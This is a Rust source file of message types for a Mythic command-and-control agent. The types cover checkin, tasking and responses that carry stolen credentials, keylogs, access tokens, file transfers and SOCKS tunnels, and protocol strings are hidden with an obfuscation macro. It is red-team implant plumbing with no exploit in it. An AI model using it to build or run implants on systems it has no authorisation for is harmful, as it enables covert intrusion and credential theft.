//! Mythic 4.0 agent message types for plaintext communication.
//!
//! Covers the core actions (checkin / get_tasking / post_response) and all
//! major hooking features that can appear inside a `responses` entry or at
//! the top level of a message.

use alloc::string::String;
use alloc::vec::Vec;

#[cfg(feature = "json")]
use serde::{Deserialize, Serialize};

#[cfg(feature = "json")]
use serde_json::Value;

// ---------------------------------------------------------------------------
// Shared / P2P
// ---------------------------------------------------------------------------

/// Delegate entry for P2P forwarding.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Delegate {
    pub message: String,
    pub c2_profile: String,
    pub uuid: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub new_uuid: Option<String>,
}

// ---------------------------------------------------------------------------
// Check-in
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinRequest {
    pub action: String,
    pub uuid: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ips: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub os: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub external_ip: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub encryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub decryption_key: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_name: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub impersonation_context: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep_info: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extra_info: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
}

impl CheckinRequest {
    pub fn new(payload_uuid: impl Into<String>) -> Self {
        Self {
            action: obfstring!("checkin"),
            uuid: payload_uuid.into(),
            ips: Vec::new(),
            os: None,
            user: None,
            host: None,
            pid: None,
            architecture: None,
            domain: None,
            integrity_level: None,
            external_ip: None,
            encryption_key: None,
            decryption_key: None,
            process_name: None,
            cwd: None,
            impersonation_context: None,
            sleep_info: None,
            extra_info: None,
            delegates: Vec::new(),
        }
    }

    pub fn with_ips(mut self, ips: Vec<String>) -> Self {
        self.ips = ips;
        self
    }
    pub fn with_os(mut self, os: impl Into<String>) -> Self {
        self.os = Some(os.into());
        self
    }
    pub fn with_user(mut self, user: impl Into<String>) -> Self {
        self.user = Some(user.into());
        self
    }
    pub fn with_host(mut self, host: impl Into<String>) -> Self {
        self.host = Some(host.into());
        self
    }
    pub fn with_pid(mut self, pid: u32) -> Self {
        self.pid = Some(pid);
        self
    }
    pub fn with_architecture(mut self, arch: impl Into<String>) -> Self {
        self.architecture = Some(arch.into());
        self
    }
    pub fn with_domain(mut self, domain: impl Into<String>) -> Self {
        self.domain = Some(domain.into());
        self
    }
    pub fn with_integrity_level(mut self, level: u32) -> Self {
        self.integrity_level = Some(level);
        self
    }
    pub fn with_external_ip(mut self, ip: impl Into<String>) -> Self {
        self.external_ip = Some(ip.into());
        self
    }
    pub fn with_process_name(mut self, name: impl Into<String>) -> Self {
        self.process_name = Some(name.into());
        self
    }
    pub fn with_cwd(mut self, cwd: impl Into<String>) -> Self {
        self.cwd = Some(cwd.into());
        self
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

impl CheckinResponse {
    pub fn success(callback_uuid: impl Into<String>) -> Self {
        Self {
            action: obfstring!("checkin"),
            id: callback_uuid.into(),
            status: obfstring!("success"),
        }
    }

    pub fn is_success(&self) -> bool {
        self.status == obfstring!("success")
    }
}

// ---------------------------------------------------------------------------
// Tasks
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Task {
    pub command: String,
    pub parameters: String,
    pub timestamp: f64,
    pub id: String,
}

// ---------------------------------------------------------------------------
// Hooking feature nested types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct FileBrowserEntry {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    pub is_file: bool,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent_path: Option<String>,
    #[serde(default)]
    pub success: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub access_time: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub modify_time: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub size: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub update_deleted: Option<bool>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<FileBrowserEntry>,
    #[cfg(feature = "json")]
    #[serde(flatten)]
    pub extra: Option<Value>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct RemovedFile {
    pub host: String,
    pub path: String,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Credential {
    pub credential_type: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub credential_subtype: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub realm: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub account: Option<String>,
    pub credential: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub comment: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub custom_display: Option<String>,
    #[cfg(feature = "json")]
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub metadata: Option<Value>,
    #[cfg(feature = "json")]
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub credential_identity: Option<Value>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Artifact {
    pub base_artifact: String,
    pub artifact: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct ProcessInfo {
    pub process_id: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent_process_id: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bin_path: Option<String>,
    pub name: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command_line: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub start_time: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signer: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub protected_process_level: Option<u32>,
    #[cfg(feature = "json")]
    #[serde(flatten)]
    pub extra: Option<Value>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct ProcessListing {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub os: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub update_deleted: Option<bool>,
    pub processes: Vec<ProcessInfo>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Edge {
    pub source: String,
    pub destination: String,
    pub action: String, // "add" | "remove"
    pub c2_profile: String,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CommandUpdate {
    pub action: String, // "add"
    pub cmd: String,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Keylog {
    pub window_title: String,
    pub user: String,
    pub keystrokes: String,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Token {
    pub token_id: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub groups: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub privileges: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub thread_id: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_id: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub logon_sid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub integrity_level_sid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub restricted: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub default_dacl: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub handle: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub capabilities: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub app_container_sid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub app_container_number: Option<u32>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CallbackToken {
    pub action: String, // "add" | "remove"
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    pub token_id: u32,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Download {
    // Registration
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub total_size: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub total_chunks: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_size: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub is_screenshot: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub filename: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
    // Data
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_offset: Option<u64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Upload {
    pub file_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_size: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub full_path: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Alert {
    pub alert: String,
    pub level: String, // "info" | "warning" | "error"
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub send_webhook: Option<bool>,
    #[cfg(feature = "json")]
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook_alert: Option<Value>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct AgentRpc {
    pub name: String,
    #[cfg(feature = "json")]
    pub arguments: Value,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CallbackUpdate {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub impersonation_context: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep_info: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub extra_info: Option<String>,
    #[cfg(feature = "json")]
    #[serde(flatten)]
    pub extra: Option<Value>,
}

// Top-level channel messages
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct SocksMessage {
    pub server_id: u32,
    pub data: String,
    #[serde(default)]
    pub exit: bool,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct RpfwdMessage {
    pub server_id: u32,
    pub data: String,
    #[serde(default)]
    pub exit: bool,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct InteractiveMessage {
    pub task_id: String,
    pub message_type: i32,
    pub data: String,
}

// ---------------------------------------------------------------------------
// Task responses (the big one)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Default)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponse {
    pub task_id: String,

    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user_output: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub completed: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,

    #[cfg(feature = "json")]
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_response: Option<Value>,

    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file_browser: Option<FileBrowserEntry>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub removed_files: Vec<RemovedFile>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub credentials: Vec<Credential>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub artifacts: Vec<Artifact>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub processes: Option<ProcessListing>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub edges: Vec<Edge>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub commands: Vec<CommandUpdate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub keylogs: Vec<Keylog>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tokens: Vec<Token>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub callback_tokens: Vec<CallbackToken>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub download: Option<Download>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub upload: Option<Upload>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub alerts: Vec<Alert>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent_rpc: Option<AgentRpc>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub callback: Option<CallbackUpdate>,
}

impl TaskResponse {
    pub fn new(task_id: impl Into<String>) -> Self {
        Self {
            task_id: task_id.into(),
            ..Default::default()
        }
    }

    pub fn with_output(mut self, output: impl Into<String>) -> Self {
        self.user_output = Some(output.into());
        self
    }

    pub fn completed(mut self) -> Self {
        self.completed = Some(true);
        self
    }

    pub fn with_status(mut self, status: impl Into<String>) -> Self {
        self.status = Some(status.into());
        self
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponseAck {
    pub task_id: String,
    pub status: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file_id: Option<String>,
    #[cfg(feature = "json")]
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub output: Option<Value>,
}

// ---------------------------------------------------------------------------
// Get tasking / Post response
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingRequest {
    pub action: String,
    pub tasking_size: i32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub get_delegate_tasks: Option<bool>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub responses: Vec<TaskResponse>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<RpfwdMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
}

impl GetTaskingRequest {
    pub fn new(tasking_size: i32) -> Self {
        Self {
            action: obfstring!("get_tasking"),
            tasking_size,
            get_delegate_tasks: None,
            delegates: Vec::new(),
            responses: Vec::new(),
            socks: Vec::new(),
            rpfwd: Vec::new(),
            interactive: Vec::new(),
        }
    }

    pub fn all() -> Self {
        Self::new(-1)
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingResponse {
    pub action: String,
    #[serde(default)]
    pub tasks: Vec<Task>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub responses: Vec<TaskResponseAck>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<RpfwdMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseRequest {
    pub action: String,
    pub responses: Vec<TaskResponse>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<RpfwdMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
}

impl PostResponseRequest {
    pub fn new(responses: Vec<TaskResponse>) -> Self {
        Self {
            action: obfstring!("post_response"),
            responses,
            delegates: Vec::new(),
            socks: Vec::new(),
            rpfwd: Vec::new(),
            interactive: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseResponse {
    pub action: String,
    #[serde(default)]
    pub responses: Vec<TaskResponseAck>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<Delegate>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<RpfwdMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
}
